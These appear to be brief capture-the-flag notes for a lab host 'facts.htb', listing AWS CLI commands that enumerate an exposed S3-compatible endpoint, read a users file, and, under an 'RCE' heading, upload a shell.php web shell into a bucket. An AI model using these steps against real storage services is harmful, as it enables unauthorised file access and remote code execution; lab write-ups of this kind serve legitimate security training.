```
aws configure
```

default region = us-east-1

See bucket
```
aws s3 ls --endpoint-url=http://facts.htb:54321
```

---

# RCE 

If the bucket is called /storage
```
aws --endpoint-url=http://facts.htb:54321 s3 cp shell.php s3://storage/shell.php
```


Go into a folder
```
aws s3 ls s3://randomfacts --endpoint-url http://facts.htb:54321
```

Read file
```
aws s3 cp s3://randomfacts/Users.txt - --endpoint-url http://facts.htb:54321
```